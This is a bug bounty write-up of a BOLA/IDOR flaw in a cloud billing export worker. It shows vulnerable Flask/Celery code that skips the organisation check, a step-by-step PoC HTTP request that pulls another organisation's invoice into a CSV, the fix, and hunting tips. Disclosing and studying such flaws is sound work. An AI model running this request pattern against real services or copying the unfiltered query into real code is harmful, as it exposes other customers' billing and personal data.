# Success Post-Mortem: BOLA / IDOR in Organization Invoice Export Worker

## 1. Executive Summary & Impact
During security testing of **Acme Cloud Services** under their public HackerOne bug bounty program, a Critical/High Broken Object Level Authorization (BOLA/IDOR) vulnerability was discovered in the asynchronous billing invoice export subsystem. 

An authenticated member of any free or enterprise organization could trigger bulk export operations referencing invoices of arbitrary other organizations, obtaining full billing line items, credit card last4/expiry, VAT numbers, and corporate contact details.

- **Bounty Awarded:** $3,000 USD
- **Assessed Severity:** High (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N - 8.5)
- **Triage Latency:** Validated in 4 hours, paid in 72 hours.

---

## 2. Technical Vulnerability Analysis

The web application exposes an export feature in the billing dashboard:
`POST /api/v2/organizations/{org_id}/exports/invoices`

While standard invoice views (`GET /api/v2/organizations/{org_id}/invoices/{invoice_id}`) enforced database-level multi-tenancy verification (`WHERE organization_id = :current_org AND id = :invoice_id`), the asynchronous batch export job was queued via Redis/Celery without organization context:

```python
# Flawed Controller Logic
@app.route('/api/v2/organizations/<org_id>/exports/invoices', methods=['POST'])
@require_auth
def queue_invoice_export(org_id):
    # org_id validation on route was present, but invoice_ids array was unvalidated:
    invoice_ids = request.json.get('invoice_ids', [])
    task = export_worker.delay(user_id=current_user.id, target_invoices=invoice_ids)
    return jsonify({"job_id": task.id}), 202
```

The Celery worker directly executed:
```python
# Celery worker:
invoices = db.session.query(Invoice).filter(Invoice.id.in_(target_invoices)).all()
csv_data = generate_csv(invoices)
upload_to_s3_and_notify(user_id, csv_data)
```

Because the worker only queried by `Invoice.id.in_(...)` and omitted `Invoice.organization_id == current_user.org_id`, any invoice ID passed by the attacker was included in the generated CSV file and emailed or provided via download link.

## 3. Reproduction Steps (PoC)

1. Authenticate as User A (Organization `org_alpha_123`).
2. Identify a victim invoice ID from Organization B (`inv_victim_8849`).
3. Send the following HTTP request:

```http
POST /api/v2/organizations/org_alpha_123/exports/invoices HTTP/1.1
Host: api.acmecloud.io
Authorization: Bearer <USER_A_TOKEN>
Content-Type: application/json

{
  "format": "csv",
  "invoice_ids": [
    "inv_victim_8849",
    "inv_alpha_001"
  ]
}
```

4. The server responds with `202 Accepted`:
```json
{
  "status": "queued",
  "job_id": "job_exp_77192bc8"
}
```

5. When the job completes, download the generated export file:
```csv
invoice_id,org_name,customer_email,amount,billing_address,vat_number
inv_victim_8849,Victim Global Corp,finance@victimcorp.com,14500.00,"100 Tech Blvd, SF, CA",US9928192
inv_alpha_001,Alpha Org,admin@alpha.com,49.00,"12 Market St, Austin, TX",US110293
```

---

## 4. Remediation
Acme Cloud Services patched the worker to strictly enforce organization boundaries during query construction:

```python
invoices = (
    db.session.query(Invoice)
    .filter(Invoice.id.in_(target_invoices), Invoice.organization_id == user.organization_id)
    .all()
)
```

---

## 5. Hunter Takeaways & Tactical Value
- **Microservices & Async Workers:** Always look for endpoints that dispatch background tasks (exports, PDF renders, email summaries, batch deletions). Developers often decouple these from the web session context.
- **Payload Arrays:** Any parameter taking a list (`ids`, `items`, `targets`) should immediately be tested for cross-tenant elements.
